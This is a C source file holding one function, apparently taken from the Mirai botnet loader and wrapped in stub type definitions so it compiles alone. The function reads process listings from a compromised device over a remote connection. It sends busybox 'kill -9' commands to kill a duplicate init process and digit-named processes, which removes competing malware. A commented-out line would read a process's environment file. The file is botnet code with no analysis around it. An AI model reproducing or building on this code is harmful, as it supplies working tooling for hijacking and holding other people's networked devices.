#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int uint8_t ;
struct connection {char* rdbuf; int rdbuf_pos; int /*<<< orphan*/  fd; } ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 scalar_t__ FALSE ; 
 char* TOKEN_RESPONSE ; 
 scalar_t__ TRUE ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  memmove (char*,char*,int) ; 
 int /*<<< orphan*/  printf (char*,int,char*) ; 
 scalar_t__ strcmp (char*,char*) ; 
 int strlen (char*) ; 
 int util_memsearch (char*,int,char*,int) ; 
 int /*<<< orphan*/  util_sockprintf (int /*<<< orphan*/ ,char*,int) ; 

int connection_consume_psoutput(struct connection *conn)
{
    int offset;
    char *start = conn->rdbuf;
    int i, ii;

    offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    for (i = 0; i < (offset == -1 ? conn->rdbuf_pos : offset); i++)
    {
        if (conn->rdbuf[i] == '\r')
            conn->rdbuf[i] = 0;
        else if (conn->rdbuf[i] == '\n')
        {
            uint8_t option_on = 0;
            BOOL last_character_was_space = FALSE;
            char *pid_str = NULL, *proc_name = NULL;

            conn->rdbuf[i] = 0;
            for (ii = 0; ii < ((char *)&conn->rdbuf[i] - start); ii++)
            {
                if (start[ii] == ' ' || start[ii] == '\t' || start[ii] == 0)
                {
                    if (option_on > 0 && !last_character_was_space)
                        option_on++;
                    start[ii] = 0;
                    last_character_was_space = TRUE;
                }
                else
                {
                    if (option_on == 0)
                    {
                        pid_str = &start[ii];
                        option_on++;
                    }
                    else if (option_on >= 3 && option_on <= 5 && last_character_was_space)
                    {
                        proc_name = &start[ii];
                    }
                    last_character_was_space = FALSE;
                }
            }

            if (pid_str != NULL && proc_name != NULL)
            {
                int pid = atoi(pid_str);
                int len_proc_name = strlen(proc_name);

#ifdef DEBUG
                printf("pid: %d, proc_name: %s\n", pid, proc_name);
#endif

                if (pid != 1 && (strcmp(proc_name, "init") == 0 || strcmp(proc_name, "[init]") == 0)) // Kill the second init
                    util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                else if (pid > 400)
                {
                    int num_count = 0;
                    int num_alphas = 0;

                    for (ii = 0; ii < len_proc_name; ii++)
                    {
                        if (proc_name[ii] >= '0' && proc_name[ii] <= '9')
                            num_count++;
                        else if ((proc_name[ii] >= 'a' && proc_name[ii] <= 'z') || (proc_name[ii] >= 'A' && proc_name[ii] <= 'Z'))
                        {
                            num_alphas++;
                            break;
                        }
                    }

                    if (num_alphas == 0 && num_count > 0)
                    {
                        //util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
#ifdef DEBUG
                        printf("Killing suspicious process (pid=%d, name=%s)\n", pid, proc_name);
#endif
                        util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                    }
                }
            }

            start = conn->rdbuf + i + 1;
        }
    }

    if (offset == -1)
    {
        if (conn->rdbuf_pos > 7168)
        {
            memmove(conn->rdbuf, conn->rdbuf + 6144, conn->rdbuf_pos - 6144);
            conn->rdbuf_pos -= 6144;
        }
        return 0;
    }
    else
    {
        for (i = 0; i < conn->rdbuf_pos; i++)
        {
            if (conn->rdbuf[i] == 0)
                conn->rdbuf[i] = ' ';
        }
        return offset;
    }
}